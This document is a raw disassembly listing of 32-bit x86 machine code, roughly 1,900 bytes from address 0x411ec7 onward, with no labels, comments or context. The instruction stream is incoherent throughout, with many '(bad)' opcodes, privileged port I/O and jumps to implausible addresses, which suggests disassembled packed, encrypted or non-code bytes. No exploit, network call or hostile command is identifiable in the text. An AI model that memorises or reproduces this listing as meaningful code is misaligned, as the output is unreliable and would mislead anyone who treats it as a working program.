  411ec7:	xchg   esi,eax
  411ec8:	sahf   
  411ec9:	or     BYTE PTR [edi+0x32e8e660],ch
  411ecf:	and    bl,dl
  411ed1:	sahf   
  411ed2:	adc    eax,0x5f5cd24
  411ed7:	push   edx
  411ed8:	mov    bh,0x6b
  411eda:	adc    DWORD PTR [edx-0x1b],ecx
  411edd:	lods   eax,DWORD PTR ds:[esi]
  411ede:	lahf   
  411edf:	dec    ecx
  411ee0:	jecxz  0x411f29
  411ee2:	push   ecx
  411ee3:	push   es
  411ee4:	mov    BYTE PTR [eax-0x3b3fc5c5],bl
  411eea:	fs push esp
  411eec:	jg     0x411ea5
  411eee:	cs in  eax,0x45
  411ef1:	push   edx
  411ef2:	in     eax,0x7c
  411ef4:	adc    ebp,DWORD PTR [eax+0x48]
  411ef7:	and    BYTE PTR [ecx+ebx*1+0x44],0xf1
  411efc:	and    BYTE PTR [edx-0x46],dh
  411eff:	pusha  
  411f00:	ja     0x411ebc
  411f02:	fisubr WORD PTR [edi-0x4a057859]
  411f08:	scas   al,BYTE PTR es:[edi]
  411f09:	(bad)  
  411f0a:	clc    
  411f0b:	adc    edx,eax
  411f0d:	test   BYTE PTR [ebx-0x6d],cl
  411f10:	add    eax,0x238c5ac5
  411f15:	push   ebx
  411f16:	push   0x3818327d
  411f1b:	or     BYTE PTR [eax-0x26dd2fbf],ah
  411f21:	adc    eax,0x22b6be96
  411f26:	mov    esp,0xd0df80f7
  411f2b:	push   edx
  411f2c:	stc    
  411f2d:	test   BYTE PTR [ebx+0x5e5ff2da],dh
  411f33:	int3   
  411f34:	lods   al,BYTE PTR ds:[esi]
  411f35:	jb     0x411ed0
  411f37:	test   BYTE PTR [edx],cl
  411f39:	lea    eax,[eax]
  411f3b:	pop    edx
  411f3c:	cmp    al,0xf6
  411f3e:	retf   
  411f3f:	enter  0x7f85,0x1b
  411f43:	in     eax,dx
  411f44:	sub    dl,BYTE PTR [eax-0xaf3a84d]
  411f4a:	xchg   edi,eax
  411f4b:	pushf  
  411f4c:	mov    BYTE PTR [ebx+0x66],bl
  411f4f:	les    edi,FWORD PTR ds:0x891d5462
  411f55:	push   edi
  411f56:	lea    esp,[ebx-0x5f]
  411f59:	and    esi,ebx
  411f5b:	pop    esp
  411f5c:	repz es cmp eax,0x9a68b505
  411f63:	add    edx,DWORD PTR [edx+eiz*1]
  411f66:	retf   
  411f67:	data16 cli 
  411f69:	cmp    BYTE PTR [ebx+0x58f04b86],bh
  411f6f:	in     eax,dx
  411f70:	out    0x5c,eax
  411f72:	and    eax,0x19369ac1
  411f77:	aam    0x9b
  411f79:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f7a:	hlt    
  411f7b:	add    dl,al
  411f7d:	outs   dx,DWORD PTR ds:[esi]
  411f7e:	or     eax,0x8c6d4d7f
  411f83:	xchg   esi,eax
  411f84:	cmp    eax,0xbc2149c6
  411f89:	jle    0x411fb0
  411f8b:	cmp    DWORD PTR [ecx+eiz*4+0x4d5a5789],ecx
  411f92:	fwait
  411f93:	mov    eax,ds:0xc8786d51
  411f98:	icebp  
  411f99:	in     eax,0x89
  411f9b:	pop    edx
  411f9c:	adc    al,0x8d
  411f9e:	dec    esi
  411f9f:	int3   
  411fa0:	mov    bh,0xf9
  411fa2:	lahf   
  411fa3:	pop    ebx
  411fa4:	dec    ecx
  411fa5:	aaa    
  411fa6:	loope  0x411fb9
  411fa8:	mov    cl,0x32
  411faa:	fsubr  st(5),st
  411fac:	shl    BYTE PTR [ebp+0x6a],1
  411faf:	xchg   esi,eax
  411fb0:	rcl    BYTE PTR [eax+0x61],0x65
  411fb4:	pop    ebp
  411fb5:	scas   eax,DWORD PTR es:[edi]
  411fb6:	enter  0xe63c,0x83
  411fba:	mov    ?,WORD PTR [edx]
  411fbc:	jmp    0x18895c3
  411fc1:	in     eax,0xc3
  411fc3:	aas    
  411fc4:	mov    BYTE PTR [ecx+esi*2],ch
  411fc7:	sbb    esi,DWORD PTR [ebp-0x8]
  411fca:	test   eax,esi
  411fcc:	xor    ebx,DWORD PTR [ebx+edi*4+0x68d353f7]
  411fd3:	push   0x2b
  411fd5:	lods   eax,DWORD PTR ds:[esi]
  411fd6:	(bad)  
  411fd7:	pop    ebx
  411fd8:	xchg   edx,eax
  411fd9:	cmp    DWORD PTR [ebx-0x7ab94342],ebx
  411fdf:	mov    edx,0xdbb9c309
  411fe4:	lahf   
  411fe5:	xor    al,0xc0
  411fe7:	mov    bh,bh
  411fe9:	rol    DWORD PTR [ebx+0x35],1
  411fec:	loopne 0x412029
  411fee:	das    
  411fef:	dec    esp
  411ff0:	cs out 0xa9,al
  411ff3:	jle    0x411ff2
  411ff5:	jle    0x411f8c
  411ff7:	aam    0xa5
  411ff9:	jmp    0x6ebdf532
  411ffe:	jg     0x411f9b
  412000:	and    eax,0xe6bde2f9
  412005:	mov    ecx,0x1735baff
  41200a:	mov    dl,0x49
  41200c:	test   ch,ch
  41200e:	add    BYTE PTR [ecx+0x6c13bd24],bl
  412014:	add    esi,ebp
  412016:	(bad)  
  412017:	je     0x41200a
  412019:	idiv   DWORD PTR [edi-0xb]
  41201c:	add    eax,0xe177c130
  412021:	(bad)  
  412022:	ins    DWORD PTR es:[edi],dx
  412023:	mov    ch,BYTE PTR [esi-0x52]
  412026:	shl    DWORD PTR [edx+0x34a1a02b],1
  41202c:	jb     0x41207d
  41202e:	jns    0x411fee
  412030:	cmp    eax,0x68b79737
  412035:	dec    cl
  412037:	out    dx,al
  412038:	add    eax,0xa59d55b0
  41203d:	(bad)  
  41203e:	sbb    dl,BYTE PTR [ebp-0x5e318d1a]
  412044:	mov    ebp,0x5dfee774
  412049:	imul   ebx,DWORD PTR ds:0x64179278,0xea4cf1e4
  412053:	adc    al,BYTE PTR ds:0xfbda0395
  412059:	lods   al,BYTE PTR ds:[esi]
  41205a:	inc    esi
  41205b:	std    
  41205c:	popa   
  41205d:	in     al,dx
  41205e:	cld    
  41205f:	int3   
  412060:	into   
  412061:	sbb    cl,BYTE PTR [edi]
  412063:	repz sbb al,0x76
  412066:	xor    dh,BYTE PTR [eax-0x70]
  412069:	sahf   
  41206a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41206b:	cli    
  41206c:	loop   0x412018
  41206e:	retf   0x2e12
  412071:	push   ebx
  412072:	in     al,0x1d
  412074:	outs   dx,DWORD PTR ds:[esi]
  412075:	inc    esi
  412076:	dec    edx
  412077:	inc    edi
  412078:	icebp  
  412079:	inc    ebx
  41207a:	lds    eax,FWORD PTR [edx-0x17ab8db2]
  412080:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412081:	dec    esi
  412082:	into   
  412083:	(bad)  
  412085:	xchg   ebx,eax
  412086:	loope  0x412029
  412088:	mov    ds:0x35618d5d,eax
  41208d:	fs out dx,al
  41208f:	add    DWORD PTR [esi-0x6d6142af],0xfffffff5
  412096:	sub    ebp,DWORD PTR [edx-0x4e]
  412099:	repz and bh,BYTE PTR [edx]
  41209c:	pop    ebp
  41209d:	jecxz  0x4120b0
  41209f:	sub    BYTE PTR [edi],bh
  4120a1:	leave  
  4120a2:	or     eax,0x829a2335
  4120a7:	test   BYTE PTR [eax+edx*8-0x22],ch
  4120ab:	mov    ecx,0x8b8ec25e
  4120b0:	js     0x412047
  4120b2:	in     eax,0xa8
  4120b4:	iret   
  4120b5:	in     eax,dx
  4120b6:	fld    DWORD PTR [ecx]
  4120b8:	add    BYTE PTR fs:[ebp+ebx*4-0x6d],bh
  4120bd:	aam    0xa3
  4120bf:	test   BYTE PTR [esi-0x31],al
  4120c2:	cli    
  4120c3:	mov    cl,bl
  4120c5:	adc    dh,BYTE PTR [ebp-0x2c]
  4120c8:	pop    ecx
  4120c9:	jne    0x4120af
  4120cb:	fsubr  QWORD PTR [edi-0x63]
  4120ce:	rcl    BYTE PTR ds:0x1826f576,cl
  4120d4:	cld    
  4120d5:	mov    esp,0x5a994432
  4120da:	sbb    esp,DWORD PTR ds:0xb4216e8a
  4120e0:	jo     0x41208d
  4120e2:	out    dx,al
  4120e3:	sbb    dh,BYTE PTR [edx-0x12]
  4120e6:	(bad)  
  4120e7:	push   eax
  4120e8:	in     al,dx
  4120e9:	inc    eax
  4120ea:	and    eax,0xd0235a79
  4120ef:	es iret 
  4120f1:	out    dx,al
  4120f2:	loop   0x4120f0
  4120f4:	jmp    DWORD PTR [ebx]
  4120f6:	push   ecx
  4120f7:	dec    edx
  4120f8:	dec    ecx
  4120f9:	lds    ebp,FWORD PTR [ebx]
  4120fb:	pop    ds
  4120fc:	push   ds
  4120fd:	mov    ebx,0x2ab5505b
  412102:	jge    0x412160
  412104:	neg    BYTE PTR [ebp-0x187706fe]
  41210a:	pop    ds
  41210b:	push   es
  41210c:	popa   
  41210d:	mov    al,0xe9
  41210f:	pop    ss
  412110:	push   ds
  412111:	sbb    ebx,esi
  412113:	push   0xffffffe3
  412115:	inc    edi
  412116:	scas   eax,DWORD PTR es:[edi]
  412117:	daa    
  412118:	mov    ecx,0x43d2cf83
  41211d:	pop    ebp
  41211e:	dec    esi
  41211f:	sbb    al,BYTE PTR [eax+0x7828f937]
  412125:	or     esp,0xfddd7222
  41212b:	or     al,0x22
  41212d:	scas   eax,DWORD PTR es:[edi]
  41212e:	push   cs
  41212f:	sub    BYTE PTR [edi],cl
  412131:	jb     0x4121a0
  412133:	push   esi
  412134:	rol    BYTE PTR [ebx-0x1a],cl
  412137:	or     DWORD PTR [ebx+0x31a0f9a7],ecx
  41213d:	mov    ebp,0xcf003517
  412142:	jle    0x412107
  412144:	sbb    al,0x63
  412146:	ss push cs
  412148:	cld    
  412149:	xchg   edi,edx
  41214b:	shl    DWORD PTR [eax],1
  41214d:	stos   DWORD PTR es:[edi],eax
  41214e:	add    al,0xb2
  412150:	and    cl,BYTE PTR [edx-0x6d]
  412153:	sbb    eax,0x7c24d61f
  412158:	nop
  412159:	cmp    eax,0x521d17d3
  41215e:	inc    ecx
  41215f:	inc    eax
  412160:	int3   
  412161:	les    edx,FWORD PTR [ebp+0x12d11e48]
  412167:	mov    bh,0x61
  412169:	xor    BYTE PTR [ecx],ch
  41216b:	cli    
  41216c:	fs and edx,0xffffff84
  412170:	and    ebx,edx
  412172:	adc    BYTE PTR [ebx-0x87fe9e5],al
  412178:	mov    ds:0x8dffc2c3,al
  41217d:	dec    ebx
  41217e:	test   al,0xf
  412180:	xchg   edx,eax
  412181:	xor    edx,0xa173a81d
  412187:	jne    0x41216f
  412189:	xchg   esi,eax
  41218a:	pop    ds
  41218b:	icebp  
  41218c:	sahf   
  41218d:	scas   eax,DWORD PTR es:[edi]
  41218e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41218f:	rcl    BYTE PTR [ebp-0x68],cl
  412192:	add    eax,0xbdd86a34
  412197:	aas    
  412198:	ins    DWORD PTR es:[edi],dx
  412199:	sahf   
  41219a:	rcr    DWORD PTR [ebx-0x282420d3],0x9
  4121a1:	pop    ebp
  4121a2:	lods   al,BYTE PTR ds:[esi]
  4121a3:	addr16 sub ecx,ebx
  4121a6:	outs   dx,BYTE PTR ds:[esi]
  4121a7:	inc    ebp
  4121a8:	leave  
  4121a9:	mov    edi,0x96985ac2
  4121ae:	xchg   ecx,eax
  4121af:	int3   
  4121b0:	push   0x2
  4121b2:	in     al,dx
  4121b3:	push   esp
  4121b4:	out    dx,al
  4121b5:	push   ecx
  4121b6:	jbe    0x412227
  4121b8:	repnz pop edx
  4121ba:	jmp    0x716051e1
  4121bf:	into   
  4121c0:	les    edi,FWORD PTR [ecx-0x397b40d1]
  4121c6:	pop    esi
  4121c7:	jl     0x4121f1
  4121c9:	mov    ecx,0xb8465d41
  4121ce:	jnp    0x41218c
  4121d0:	fistp  DWORD PTR [esi-0x53229c6]
  4121d6:	push   esp
  4121d7:	icebp  
  4121d8:	(bad)  
  4121d9:	fidiv  DWORD PTR [edx+ebp*8]
  4121dc:	fwait
  4121dd:	push   ecx
  4121de:	es jl  0x412236
  4121e1:	stos   DWORD PTR es:[edi],eax
  4121e2:	push   ecx
  4121e3:	loope  0x4121f9
  4121e5:	push   cs
  4121e6:	lea    ecx,[ebx+0x5]
  4121e9:	xchg   edi,eax
  4121ea:	sub    al,0x90
  4121ec:	and    ecx,DWORD PTR [esi+0x72]
  4121ef:	js     0x41223e
  4121f1:	scas   eax,DWORD PTR es:[edi]
  4121f2:	dec    ebp
  4121f3:	in     eax,dx
  4121f4:	add    BYTE PTR [edi+0x2b],bl
  4121f7:	adc    eax,0x644c4dc4
  4121fc:	pop    ss
  4121fd:	jmp    0xe44b1992
  412202:	jb     0x4121e0
  412204:	(bad)  
  412205:	fisttp WORD PTR [ecx]
  412207:	jg     0x412278
  412209:	in     eax,0x85
  41220b:	(bad)  
  41220c:	outs   dx,DWORD PTR ds:[esi]
  41220d:	aas    
  41220e:	sub    ebp,DWORD PTR [eax+0x64c9c184]
  412214:	rol    DWORD PTR [esi+edi*8],0x2e
  412218:	imul   ebp,DWORD PTR [esi-0x11],0xa1d9c41c
  41221f:	sbb    BYTE PTR [bp+si],ch
  412222:	xchg   ebp,eax
  412223:	pop    eax
  412224:	aad    0x15
  412226:	cli    
  412227:	rcl    DWORD PTR ds:0xeb8618f3,0xe2
  41222e:	lea    ebp,[ecx]
  412230:	mov    bh,0xb
  412232:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412233:	gs push ecx
  412235:	push   cs
  412236:	jmp    0x882503bd
  41223b:	rol    DWORD PTR [edx],cl
  41223d:	mov    ds:0x64fb062a,eax
  412242:	loopne 0x412239
  412244:	jmp    0xad99a37
  412249:	(bad)  
  41224a:	pop    eax
  41224b:	push   eax
  41224c:	(bad)  
  41224d:	(bad)  
  41224e:	cmp    BYTE PTR [ebx],bh
  412250:	scas   al,BYTE PTR es:[edi]
  412251:	sar    DWORD PTR [ebx],1
  412253:	lahf   
  412254:	test   DWORD PTR [ecx],edi
  412256:	push   0xfffffffe
  412258:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412259:	test   al,0x7e
  41225b:	addr16 sbb eax,0xddd49aa6
  412261:	mov    dl,0x6c
  412263:	loop   0x4122da
  412265:	outs   dx,DWORD PTR ds:[esi]
  412266:	lahf   
  412267:	jmp    0x412261
  412269:	rcr    eax,1
  41226b:	clc    
  41226c:	int3   
  41226d:	adc    BYTE PTR [edi],cl
  41226f:	leave  
  412270:	aas    
  412271:	(bad)  
  412272:	or     eax,ecx
  412274:	mov    ebp,0xd2711f54
  412279:	in     eax,dx
  41227a:	shr    DWORD PTR [ebx-0x21],0x5c
  41227e:	call   0x6ceb6e0a
  412283:	xchg   edx,eax
  412284:	retf   0xb8e5
  412287:	xchg   edx,eax
  412288:	xor    dh,cl
  41228a:	mov    ebp,0x4d0b860
  41228f:	es mov cl,0xa4
  412292:	inc    ebp
  412293:	cmp    eax,0x90a9deba
  412298:	sar    BYTE PTR [esi],0x19
  41229b:	loope  0x412226
  41229d:	dec    ebx
  41229e:	inc    ebx
  41229f:	push   0xd29e952e
  4122a4:	sbb    ebp,ebp
  4122a6:	inc    esp
  4122a7:	dec    eax
  4122a8:	retf   0xe009
  4122ab:	inc    eax
  4122ac:	test   DWORD PTR [eax],ebp
  4122ae:	xlat   BYTE PTR ds:[ebx]
  4122af:	sub    BYTE PTR [ebp+0x43],bh
  4122b2:	push   ebp
  4122b3:	add    eax,0x5383b4ce
  4122b8:	mov    al,ds:0xef029d75
  4122bd:	ss pop ebp
  4122bf:	(bad)  
  4122c0:	or     BYTE PTR fs:[esi],cl
  4122c3:	dec    ebp
  4122c4:	ds out 0xf,eax
  4122c7:	or     DWORD PTR [eax-0x80],0x51cc99e9
  4122ce:	push   edi
  4122cf:	push   ebx
  4122d0:	pop    ecx
  4122d1:	daa    
  4122d2:	jns    0x41233e
  4122d4:	iret   
  4122d5:	lods   al,BYTE PTR ds:[esi]
  4122d6:	std    
  4122d7:	jae    0x4122ad
  4122d9:	nop
  4122da:	lds    ebp,FWORD PTR [edx-0x18]
  4122dd:	xchg   ebx,eax
  4122de:	outs   dx,DWORD PTR ds:[esi]
  4122df:	(bad)  
  4122e0:	inc    esp
  4122e1:	and    BYTE PTR [esi],al
  4122e3:	ins    DWORD PTR es:[edi],dx
  4122e4:	hlt    
  4122e5:	inc    ecx
  4122e6:	mov    ecx,DWORD PTR ds:0x9ab19a43
  4122ec:	repz sub eax,0x35ff3332
  4122f2:	xchg   esp,eax
  4122f3:	xor    bl,bh
  4122f5:	push   edx
  4122f6:	repz pushf 
  4122f8:	xchg   ebx,eax
  4122f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122fa:	adc    esp,DWORD PTR [ebx]
  4122fc:	xchg   ecx,eax
  4122fd:	mov    ds:0x5e346281,eax
  412302:	cs icebp 
  412304:	mov    ecx,0x4e22cbd5
  412309:	adc    edi,esp
  41230b:	pop    esi
  41230c:	cmp    DWORD PTR [ecx-0x6ffe9f33],0xe573fa49
  412316:	div    BYTE PTR [ecx+edx*8]
  412319:	iret   
  41231a:	das    
  41231b:	or     eax,DWORD PTR [ebx-0xf4fef7d]
  412321:	rol    DWORD PTR [edi-0x2f047912],1
  412327:	test   al,0x57
  412329:	and    BYTE PTR [esi],bh
  41232b:	hlt    
  41232c:	or     BYTE PTR [edx-0x2cb35a30],ch
  412332:	mov    ah,0xa6
  412334:	cmp    bl,bl
  412336:	pop    eax
  412337:	stos   BYTE PTR es:[edi],al
  412338:	and    DWORD PTR [edi+0x15],edx
  41233b:	jg     0x4122f1
  41233d:	jae    0x4123a1
  41233f:	popf   
  412340:	mov    edx,0x92ee676e
  412345:	lea    esp,[esi+edi*4+0x16]
  412349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41234a:	xor    eax,0x1f0e81b4
  41234f:	dec    eax
  412350:	push   edi
  412351:	jbe    0x41236a
  412353:	and    eax,ebp
  412355:	fcomip st,st(4)
  412357:	xchg   esi,eax
  412358:	loopne 0x4123ba
  41235a:	mov    ch,0x52
  41235c:	out    dx,al
  41235d:	mov    edi,0x23b81e43
  412362:	fadd   DWORD PTR [esp+esi*8+0x3f980208]
  412369:	leave  
  41236a:	ret    0x30d
  41236d:	push   edx
  41236e:	or     BYTE PTR [edi+0x2a],cl
  412371:	rcl    ah,0x2b
  412374:	ds sti 
  412376:	dec    esp
  412377:	test   BYTE PTR [ebp+0x62],bl
  41237a:	sub    bh,BYTE PTR [edi+0x176a17a6]
  412380:	jge    0x412313
  412382:	fwait
  412383:	push   edi
  412384:	mov    bh,dh
  412386:	pop    edx
  412387:	stos   BYTE PTR es:[edi],al
  412388:	int3   
  412389:	dec    eax
  41238a:	fcom   DWORD PTR [esi+eax*1+0x1a806c55]
  412391:	or     BYTE PTR [edx],0x22
  412394:	leave  
  412395:	fwait
  412396:	stos   DWORD PTR es:[edi],eax
  412397:	repz bswap eax
  41239a:	cmp    edi,DWORD PTR [edx]
  41239c:	xor    al,0x18
  41239e:	(bad)  
  41239f:	push   eax
  4123a0:	push   cs
  4123a1:	add    BYTE PTR [edi],dl
  4123a3:	mov    bh,0xb
  4123a5:	or     esi,DWORD PTR [edi+0x17]
  4123a8:	push   ss
  4123a9:	lods   al,BYTE PTR ds:[esi]
  4123aa:	ins    BYTE PTR es:[edi],dx
  4123ab:	aad    0x22
  4123ad:	out    dx,eax
  4123ae:	push   esi
  4123af:	sbb    esp,DWORD PTR [ebx+0x78]
  4123b2:	pushf  
  4123b3:	fdivr  DWORD PTR [esi+eiz*8-0x34e6cb95]
  4123ba:	lock add DWORD PTR ds:0xb505c28b,ecx
  4123c1:	das    
  4123c2:	in     al,0xc
  4123c4:	(bad)  
  4123c5:	pop    edx
  4123c6:	in     eax,0x6
  4123c8:	mov    ebx,0xaf416efa
  4123cd:	cwde   
  4123ce:	mov    ecx,0x348bed9e
  4123d3:	dec    esi
  4123d4:	(bad)  
  4123d5:	mov    al,BYTE PTR [esp+ebp*4+0x67d05003]
  4123dc:	lahf   
  4123dd:	into   
  4123de:	aas    
  4123df:	add    BYTE PTR [ebx-0x29],dl
  4123e2:	sbb    bl,BYTE PTR ss:[ebx-0x28]
  4123e6:	ins    BYTE PTR es:[edi],dx
  4123e7:	jmp    0x6a8c:0x95a6a4e1
  4123ee:	sbb    al,0xca
  4123f0:	jmp    0xfba:0x47854fc4
  4123f7:	pop    ebp
  4123f8:	stos   BYTE PTR es:[edi],al
  4123f9:	shl    BYTE PTR [ecx+0x76],0x4b
  4123fd:	adc    ch,BYTE PTR [ebx+edi*4-0x2fb12cf5]
  412404:	dec    edi
  412405:	in     al,0xf6
  412407:	push   ebp
  412408:	test   BYTE PTR [ebp-0x19],al
  41240b:	sar    BYTE PTR [eax+edi*4],0x82
  41240f:	mov    BYTE PTR [ecx+0x42],bh
  412412:	add    ebx,DWORD PTR [edi+0x2ad8b9f7]
  412418:	mov    ch,BYTE PTR ds:[ebp-0x4e254a2c]
  41241f:	sub    eax,0x9d798416
  412424:	(bad)  
  412425:	(bad)  
  412426:	daa    
  412427:	jo     0x412478
  412429:	lea    edx,[edx]
  41242b:	cmp    eax,0x692e9aa2
  412430:	lods   al,BYTE PTR ds:[esi]
  412431:	and    DWORD PTR [edx+0x3b],edi
  412434:	xor    DWORD PTR ds:0xfc8823c8,edi
  41243a:	adc    edx,esi
  41243c:	js     0x412405
  41243e:	xchg   ebx,eax
  41243f:	inc    edi
  412440:	sub    bl,0x35
  412443:	leave  
  412444:	in     al,dx
  412445:	test   DWORD PTR [edi],esp
  412447:	ds add ax,0x1e25
  41244c:	inc    eax
  41244d:	mov    dh,0x98
  41244f:	adc    bl,bh
  412451:	push   ds
  412452:	ja     0x412421
  412454:	mov    BYTE PTR [ebp-0x45],bl
  412457:	jo     0x412450
  412459:	icebp  
  41245a:	stos   BYTE PTR es:[edi],al
  41245b:	or     esp,DWORD PTR [esi]
  41245d:	cmp    eax,DWORD PTR [ebp-0x6b2a915]
  412463:	dec    ebp
  412464:	loopne 0x4123f9
  412466:	das    
  412467:	push   0xffffffc7
  412469:	outs   dx,BYTE PTR ds:[esi]
  41246a:	mov    ?,ebp
  41246c:	add    BYTE PTR [edi+0x67],dl
  41246f:	test   BYTE PTR [ebx],0x8c
  412472:	arpl   WORD PTR [edx],sp
  412474:	mov    cl,0xa9
  412476:	mov    al,0xf4
  412478:	fucomip st,st(1)
  41247a:	pop    es
  41247b:	mov    cl,0x3
  41247d:	pop    esi
  41247e:	jle    0x412482
  412480:	sti    
  412481:	mov    eax,ds:0xf01029dc
  412486:	push   ecx
  412487:	inc    ebx
  412488:	std    
  412489:	aam    0xc
  41248b:	mov    dh,0xd3
  41248d:	mov    dl,0x8f
  41248f:	mov    al,ds:0xcc7fad9
  412494:	das    
  412495:	and    eax,0x228f92c3
  41249a:	cmp    eax,0x858f1baf
  41249f:	and    BYTE PTR [ecx-0x60140959],dl
  4124a5:	ja     0x41242b
  4124a7:	test   BYTE PTR [ebx+0x19],cl
  4124aa:	ret    
  4124ab:	pop    ebx
  4124ac:	hlt    
  4124ad:	or     ebp,DWORD PTR [edi]
  4124af:	sbb    ch,BYTE PTR [ebp+0x2abbd95b]
  4124b5:	int    0x3c
  4124b7:	mov    WORD PTR [eax+0x66],fs
  4124ba:	inc    esi
  4124bb:	popa   
  4124bc:	sub    BYTE PTR [ebx+0x14114a26],dh
  4124c2:	inc    edx
  4124c3:	lods   al,BYTE PTR ds:[esi]
  4124c4:	or     DWORD PTR [esi+esi*8],0x11
  4124c8:	adc    DWORD PTR [eax-0x5],ecx
  4124cb:	js     0x412511
  4124cd:	pop    esp
  4124ce:	test   DWORD PTR [eax],esp
  4124d0:	jmp    0x833f:0xd2d87d5a
  4124d7:	adc    BYTE PTR [eax],0x3a
  4124da:	or     ecx,DWORD PTR [eax]
  4124dc:	in     al,dx
  4124dd:	test   BYTE PTR ds:0xa493d80d,ah
  4124e3:	es cdq 
  4124e5:	cld    
  4124e6:	adc    BYTE PTR [ebx+0x25970deb],dh
  4124ec:	pop    ss
  4124ed:	add    cl,0x7f
  4124f0:	fdiv   DWORD PTR [edx+0x2a]
  4124f3:	pop    ds
  4124f4:	jbe    0x4124ed
  4124f6:	pop    ebp
  4124f7:	jae    0x4124f2
  4124f9:	pop    ebp
  4124fa:	nop
  4124fb:	pop    es
  4124fc:	call   0x64a01881
  412501:	or     BYTE PTR [esi],dh
  412503:	addr16 nop
  412505:	repz pop ds
  412507:	jl     0x412497
  412509:	dec    edx
  41250a:	and    bl,BYTE PTR [edx-0x7f7c1046]
  412510:	xor    DWORD PTR [ebx],esi
  412512:	and    eax,0x66bcfd22
  412517:	sbb    ah,BYTE PTR [ecx]
  412519:	es inc edx
  41251b:	test   esi,eax
  41251d:	ret    
  41251e:	jbe    0x4124a2
  412520:	(bad)  
  412521:	sbb    ch,BYTE PTR [edi]
  412523:	mov    bh,0xc2
  412525:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412527:	mov    ch,bh
  412529:	fmul   st,st(7)
  41252b:	loop   0x4124e8
  41252d:	(bad)  [edx]
  41252f:	inc    ebx
  412530:	(bad)  
  412531:	ja     0x412540
  412533:	jl     0x41254b
  412535:	cdq    
  412536:	stos   DWORD PTR es:[edi],eax
  412537:	and    DWORD PTR [edi+0x4ad235a1],ebx
  41253d:	aam    0x8
  41253f:	enter  0xb4c,0x36
  412543:	stos   BYTE PTR es:[edi],al
  412544:	loope  0x41250e
  412546:	stos   DWORD PTR es:[edi],eax
  412547:	shl    BYTE PTR [eax+0x5799235f],0x6a
  41254e:	aas    
  41254f:	dec    ecx
  412550:	in     al,0x24
  412552:	div    BYTE PTR [eax]
  412554:	push   esi
  412555:	cmp    dh,BYTE PTR [ecx]
  412557:	xor    bh,bh
  412559:	jl     0x4124eb
  41255b:	lea    ebx,[ecx+0x543e2ee8]
  412561:	mov    eax,0xfb758864
  412566:	adc    edx,ebp
  412568:	dec    ebx
  412569:	or     eax,0xd543fcda
  41256e:	addr16 push ebx
  412570:	adc    ah,dh
  412572:	push   esi
  412573:	lods   al,BYTE PTR ds:[esi]
  412574:	or     ebx,edi
  412576:	push   cs
  412577:	xchg   esp,eax
  412578:	fidivr DWORD PTR [ebp+0x2e]
  41257b:	push   0x5c
  41257d:	mov    BYTE PTR [eax+0x22],cl
  412580:	or     eax,0xba479815
  412585:	inc    esp
  412586:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412587:	bound  ebx,QWORD PTR [edi+0x39]
  41258a:	neg    DWORD PTR [esi-0xd71a307]
  412590:	rdmsr  
  412592:	adc    DWORD PTR [eax+ebp*8],ebx
  412595:	add    al,0x3a
  412597:	in     al,dx
  412598:	nop
  412599:	push   eax
  41259a:	pop    esp
  41259b:	mov    bh,0xe9
  41259d:	jp     0x4125a8
  41259f:	and    cl,dh
  4125a1:	cld    
  4125a2:	retf   0xa4fd
  4125a5:	mov    dl,0x23
  4125a7:	xchg   dl,bh
  4125a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125aa:	int3   
  4125ab:	and    ah,cl
  4125ad:	aad    0xd4
  4125af:	and    BYTE PTR [eax],bl
  4125b1:	sub    ecx,DWORD PTR [eax+edx*4-0x56f4c6d4]
  4125b8:	sub    ebx,DWORD PTR [ebp-0x35]
  4125bb:	cmp    al,0xbe
  4125bd:	jbe    0x4125d1
  4125bf:	popa   
  4125c0:	dec    edi
  4125c1:	mov    edx,0xbb4310e7
  4125c6:	gs push 0x13
  4125c9:	mov    al,0x3c
  4125cb:	mov    dh,BYTE PTR [edx]
  4125cd:	(bad)  
  4125ce:	cmp    eax,DWORD PTR [eax+0x14c2b79a]
  4125d4:	or     al,0xc7
  4125d6:	jns    0x4125d0
  4125d8:	jmp    0x5914b019
  4125dd:	dec    ebx
  4125de:	mov    bl,0xf7
  4125e0:	mov    BYTE PTR [ebp+0x740ce90e],cl
  4125e6:	mov    ds:0xf841e8f9,eax
  4125eb:	retf   0x6e79
  4125ee:	push   es
  4125ef:	push   cs
  4125f0:	mov    ds:0x22931e3d,al
  4125f5:	pop    ebx
  4125f6:	and    ah,BYTE PTR [ebp+0x67380369]
  4125fc:	jo     0x4125bb
  4125fe:	nop
  4125ff:	or     al,0x33
  412601:	xlat   BYTE PTR ds:[ebx]
  412602:	loope  0x412611
  412604:	hlt    
  412605:	sti    
  412606:	lea    eax,[esi]
  412608:	cli    
  412609:	sbb    ah,BYTE PTR ds:0x5d0b3b04
  41260f:	ja     0x41261c
  412611:	mov    bh,0x6c
  412613:	pusha  
  412614:	jno    0x412649
  412616:	mov    ah,0x2a
  412618:	adc    bh,ah
  41261a:	and    BYTE PTR [edi],dh
  41261c:	rol    BYTE PTR [edi],0x8c
  41261f:	or     al,0xff
  412621:	pop    edi
  412622:	push   0xffffffb3
  412624:	sub    al,0x58
  412626:	add    eax,0x9e74597d
  41262b:	pop    ecx
  41262c:	dec    DWORD PTR ds:0x74831d7d
  412632:	outs   dx,BYTE PTR ds:[esi]
  412633:	add    eax,0x69dba322
  412638:	aad    0xa2
  41263a:	sub    DWORD PTR [ecx+0x487faf1e],esi
  412640:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412641:	sbb    ah,BYTE PTR [ecx+eiz*1+0x761163ff]
  412648:	clc    
  412649:	(bad)  
  41264a:	aam    0xf1
  41264c:	es hlt 
  41264e:	xor    DWORD PTR [esp+eiz*8+0x50793c2f],ebx
  412655:	je     0x412660
  412657:	fisttp QWORD PTR [ecx]
  412659:	cmp    BYTE PTR [eax+ebp*1+0xc93041a],bl
  412660:	retf   
  412661:	mov    cl,0x4c
  412663:	adc    DWORD PTR [ebx],ebp
